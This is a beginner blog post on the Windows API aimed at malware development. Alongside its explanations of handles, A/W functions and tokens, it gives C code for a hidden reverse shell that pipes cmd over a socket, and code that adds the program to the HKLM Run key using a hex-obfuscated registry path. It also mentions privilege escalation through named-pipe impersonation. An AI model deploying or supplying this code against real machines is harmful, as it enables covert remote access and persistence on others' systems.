---
layout: post
title:  "Using and Abusing the Windows API (For Complete Beginners)"
date:   2024-12-26 15:00:00 -0600
categories: cybersecurity maldev networking
---

# Importance of the Windows API

The Windows API is central to developing tools and malware for machines running Windows. A basic understanding is crucial to learning cybersecurity and reverse engineering, I will run you through things I wish that I knew before I jumped into the documentation. 📚 

> This is definitly more of an absolute beginner's guide. If you already understand basics like W vs A functions, Handles, Access Tokens, etc., there is probably not much for you here.

# Handles and Objects

Handles appear everywhere in the API, especially when you are developing or reverse engineering malware. Creating processes, injecting into processes, duplicating tokens, changing registry keys, these are all things that require handles.

Handles refer to objects, system *things* that a programmer might want to interact with like tokens, processes, etc.

Instead of rewording it, here is the exact explaination from the [Windows Documentation](https://learn.microsoft.com/en-us/windows/win32/sysinfo/handles-and-objects).

>An object is a data structure that represents a system resource, such as a file, thread, or graphic image. Your application can't directly access object data, nor the system resource that an object represents. Instead, your application must obtain an object handle, which it can use to examine or modify the system resource. Each handle has an entry in an internally maintained table. Those entries contain the addresses of the resources, and the means to identify the resource type.

Handles are of type `HANDLE`.

# Quick Note on Windows functions.

If you take a look at the Windows docs, you will find that almost every function has both an A and W version, like `CreateProcessA` vs `CreateProcessW`. These two functions will do the same thing, however functions labeled with A use ANSI strings for input and output (1 Byte `char` strings), while W functions us Wide Strings for input and output (2 Byte `wchar_t` strings). Both types will be useful to us so keep track of them.

When writing wide strings, preceed them with an uppercase L.

{% highlight c %}
wchar_t message[] = L"Hello World!";
{% endhighlight %}

# Baby's First Reverse Shell

A great point that easily uses the Windows API for fun and profit is always some form of reverse shell. Look at the following example.

{% highlight c %}
SOCKET sockfd; // Lets assume we already have an open socket to communicate on.

STARTUPINFO sInfo;
memset(&sInfo, 0, sizeof sInfo);
sInfo.cb = sizeof sInfo;
sInfo.hStdInput = (HANDLE)sockfd;
sInfo.hStdOutput = (HANDLE)sockfd;
sInfo.hStdError = (HANDLE)sockfd;
sInfo.dwFlags = STARTF_USESTDHANDLES;

PROCESS_INFORMATION pInfo;

CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sInfo, &pInfo);
{% endhighlight %}

Here we do a few things. First, we assume that he already have an open SOCKET from WinSock. We then create a `STARTUPINFO` for us to redirect the shell's input, output, and error handles. Typically, these are the console input buffer and then the console screen buffer. However, the open socket can also be used like a handle to replace those buffers. The created shell process will esentially `send` all of the output and `recv` all of the input. We also create a `PROCESS_INFORMATION` to store information about our created process, including its handle. We then call `CreateProcessA` to open a CMD with our redirected I/O. Fun stuff! 🔥

# Registry Hijinks

As we think of super cool features to add to our super cool malware, we might at some point come into contact with the Windows Registry. Some of you might already be aware that the Registry holds values in a heirarchical tree of keys. These values, depending on the key that they are in, configure useful Windows behavior. Behavior like disabling Windows Defender and placing programs in auto-start. Here is another example using what we already know to place the currently running process into auto-start.

{% highlight c %}

HKEY key;
LSTATUS rv;

TCHAR* dir = (TCHAR*)malloc(MAX_PATH * sizeof(TCHAR));
GetModuleFileNameW(NULL, dir, 100);

wchar_t path[] = { 0x0053, 0x004f, 0x0046, 0x0054, 0x0057, 0x0041, 0x0052, 0x0045, 0x005c, 0x004d, 0x0069, 0x0063, 0x0072, 0x006f, 0x0073, 0x006f, 0x0066, 0x0074, 0x005c, 0x0057, 0x0069, 0x006e, 0x0064, 0x006f, 0x0077, 0x0073, 0x005c, 0x0043, 0x0075, 0x0072, 0x0072, 0x0065, 0x006e, 0x0074, 0x0056, 0x0065, 0x0072, 0x0073, 0x0069, 0x006f, 0x006e, 0x005c, 0x0052, 0x0075, 0x006e, 0x0000 };

rv = RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE, &key);

if (rv == ERROR_SUCCESS) {
	if (RegSetValueExW(key, L"Super Cool Stuff", 0, REG_SZ, (LPBYTE)dir, (lstrlen(dir) + 1) * sizeof(TCHAR)) != ERROR_SUCCESS) {
		pRegCloseKey(key);
	}
	else {
		pRegCloseKey(key);
		return;
	}
}

{% endhighlight %}

> TCHAR is the same as wchar_t, they are both 2 bytes.

Here we use several Windows API functions to achieve our end goal. The path variable does not need to the look like this, it is just a stack based string in hex for obfuscation purposes. However, if you were to attempt the function above on a normal user account, nothing would happen. In order for many parts of the Windows API to function we need the proper **tokens**.

# Security and Tokens + 1 Million Other Windows Things

Windows verifies security credentials for a process and thread. More accurately, there exists both a process and thread token that can both be used. There is not really a concrete use for these; many different functions use these tokens in different ways.

For example, the function `CreateProcessA` will create a new process in the context of the calling process. This function also leads into another great point about *impersonation*. If you go and read the documentation for `CreateProcessA`, you will see a note that it will not use the current impersonation token.

# Duplicating Tokens and Impersonation

Some parts of the Windows API become very useful to us as we continue on our maldev journey. A technique you may have heard of for privelege escalation is Named Pipe Impersonation. While I will not fully explain pipes, they are typically used so that two processes can share information between eachother. There exists a function that allows a named pipe server to assume the token of the client process, or in other words, to *impersonate* that client.

Functions like `DuplicateTokenEx` can then be used to create new *primary* tokens for a process. There exist other API methods to set the thread and process tokens, and tokens also have a vast amount of security configuration options as well. If you are more interested, the Windows Docs are the best way to learn about tokens.

# Key Takeaways

While it would be impossible to show the magnitude of the Windows API in a single article, this is definitely a good start. The best way to learn about about it, in my opinion, is to just build applications that use it! Go read the docs [here](https://learn.microsoft.com/en-us/windows/apps/).